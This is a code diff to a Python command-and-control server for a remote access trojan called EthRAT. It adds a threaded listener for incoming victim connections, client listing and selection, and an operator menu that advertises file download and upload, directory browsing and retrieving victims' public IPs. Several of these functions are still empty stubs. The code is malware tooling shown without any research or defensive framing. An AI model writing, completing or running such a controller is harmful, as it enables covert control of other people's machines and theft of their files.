@@ -5,7 +5,6 @@ import ctypes
 import queue
 from datetime import datetime
 import struct
-import sys
 
 # Colors
 cyan = "\033[1;36m"
@@ -36,49 +35,67 @@ logo = red + r"""
 """ + reset + "\n\n"
 
 
-def help(self):
+def help():
     """ Help Menu """
     print(green + """
-    | ------------------ | -----------------------------------------|
+    |--------------------| -----------------------------------------|
     |      Commands      |                Description               |
-    | ------------------ | -----------------------------------------|
+    |--------------------| -----------------------------------------|
     |       help         | Display help menu                        |
+    |       list         | List the connected clients               |
+    |       0            | Broadcast to all clients                 |
+    |       <clientId>   | Interract with client                    |
     |       kill         | Kill connection with client              |
+    |       exit         | Stop the server                          |
     |       download     | Download file/directory from client      |
     |       upload       | Upload file/directory to client          |
-    |       !exec        | Execute a local command                  |
     |       cd           | Browse to a directory                    |
     |       getip        | Get the clients public IP                |
-    | ------------------ | -----------------------------------------|
+    |--------------------| -----------------------------------------|
     """ + reset)
 
 def window_title(clients):
         if os.name == "nt":
                 ctypes.windll.kernel32.SetConsoleTitleW(f"EthRAT | CONNECTED CLIENTS: {len(clients)}")
 
+def list_clients(clients):
+    for index, (addr, socket) in enumerate(clients.items()):
+        print(f"{purple}{index + 1}{reset}. {green}{addr[0]}:{addr[1]}{reset}")
+
+def get_client_by_index(clients, choice):
+    client_list = list(clients.items()) 
+    if 1 <= choice <= len(client_list):
+        addr, client_socket = client_list[choice - 1]  
+        return client_socket, addr  
+    else:
+        print(f"{red}Invalid choice. Type 'list' for the connected clients{reset}")
+        return None, None
+
+
 
 def handle_client(socket):
-        try:
-            client_socket, addr = socket.accept()
-            clients[addr] = client_socket
-            print(f"\n{green}[+]{reset} Client connected: {addr[0]}:{addr[1]}\n")
-            window_title(clients)
-
-            threading.Thread(target=handle_client_commands, args=(client_socket, addr), daemon=True).start()
-           
-        except (ConnectionResetError, OSError) as e:
-             print(f"{red}[-]{reset} Client error: {e}")
-             if addr in clients:
-                del clients[addr]
+        while server_active:
+            try:
+                client_socket, addr = socket.accept()
+                clients[addr] = client_socket
+                print(f"\n{green}[+]{reset} Client connected: {addr[0]}:{addr[1]}")
                 window_title(clients)
 
+                threading.Thread(target=handle_client_commands, args=(client_socket, addr), daemon=True).start()
+
+            except (ConnectionResetError, OSError) as e:
+                 print(f"{red}[-]{reset} Client error: {e}")
+                 if addr in clients:
+                    del clients[addr]
+                    window_title(clients)
+
 def handle_client_commands(client_socket, addr):
-     try:
-          while server_active:
+    try:
+        while server_active:
             command = client_socket.recv(1024).decode()
             if not command:
                  break
-     except (ConnectionResetError, ConnectionAbortedError):
+    except (ConnectionResetError, ConnectionAbortedError):
         print(f"{red}[-]{reset} Client {addr[0]} disconnected\n")
         client_socket.close()
         if addr in clients:
@@ -86,11 +103,11 @@ def handle_client_commands(client_socket, addr):
             window_title(clients)
 
 def send(sock, data):
-  """ Bulk Send Commands And Data """
-  try:
-      sock.sendall(struct.pack('>I', len(data)) + data)
-  except (ConnectionError, OSError) as e:
-        print(f"Send failed: {e}")
+    """ Bulk Send Commands And Data """
+    try:
+        sock.sendall(struct.pack('>I', len(data)) + data)
+    except (ConnectionError, struct.error, OSError) as e:
+        print(f"{red}Send failed: {e}{reset}")
 
 def recv(sock):
     """ Receive First Letter, Then Return the rest """
@@ -100,18 +117,21 @@ def recv(sock):
             return b''
         data_len = struct.unpack('>I', data_size)[0]
         return recvall(sock, data_len)
-    except (ConnectionError, struct.error) as e:
-        print(f"Receive failed: {e}")
+    except (ConnectionError, struct.error, OSError) as e:
+        print(f"{red}Receive failed: {e}{reset}")
 
 def recvall(sock, n):
-  """ Bulk Receive Data, Including Files and Whatnot """
-  packet = b''
-  while len(packet) < n:
-    chunk = sock.recv(n - len(packet))
-    if not chunk:
-      return None
-    packet += chunk
-  return packet
+    """ Bulk Receive Data, Including Files and Whatnot """
+    try:
+        packet = b''
+        while len(packet) < n:
+          chunk = sock.recv(n - len(packet))
+          if not chunk:
+            return None
+          packet += chunk
+        return packet
+    except (ConnectionError, struct.error, OSError) as e:
+        print(f"{red}Receive all failed: {e}{reset}")
 
 def download():
     pass
@@ -122,7 +142,11 @@ def save_file():
 def upload():
     pass
 
+def send_file():
+    pass
+
 def start_server(lhost, lport):
+    global server_active
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.bind((lhost, lport))
@@ -131,16 +155,47 @@ def start_server(lhost, lport):
         os.system("cls" if os.name == "nt" else "clear")
         print(logo)
         print(yellow + "[*] Server Started On {}:{} < at [{}]".format(lhost, lport, datetime.now().strftime("%H:%M:%S")) + reset)
+        threading.Thread(target=handle_client, args=(sock,), daemon=True).start()
 
         while server_active:
-            handle_client(sock)
+            if clients: 
+                try:
+                    cmd = input(f"\n{cyan}Main>{reset} ").strip().lower()
+                    
+                    if cmd == "help":
+                        help()
+
+                    elif cmd == "list":
+                        list_clients(clients)  
+
+                    elif cmd == "0":
+                        print(f"{yellow}[*]{reset} Broadcast mode (to implement)")    
+                        
+                    elif cmd.isdigit():
+                        client_socket, addr = get_client_by_index(clients, int(cmd))
+                        if client_socket:
+                            ip, port = addr
+                            print(f"{yellow}[*]{reset} Interracting with {ip}:{port}> (to implement interaction)")
+                      
+                    elif cmd == "exit":
+                        print(f"{yellow}[*]{reset} Shutting down the server...")
+                        server_active = False
+                        
+                    else:
+                        print(f"{red}[-]{reset} Unknown command. Type 'help'")
+                        
+                except (OSError, EOFError, ValueError) as e:
+                    print(f"\n{red}[!]{reset} Error: {e}{reset}")
+                    continue
+
     except (KeyboardInterrupt, EOFError):
-        print("Keyboard Interruption")
-        sys.exit(1)
+        print("\nShutting down server...")
+        server_active = False
     except (socket.error, OSError) as e:
-        print(f"Error: {e}")
-        sys.exit(1)
+        print(f"{red}Error: {e}{reset}")
+        server_active = False
     finally:
+        server_active = False
         sock.close()
 
 
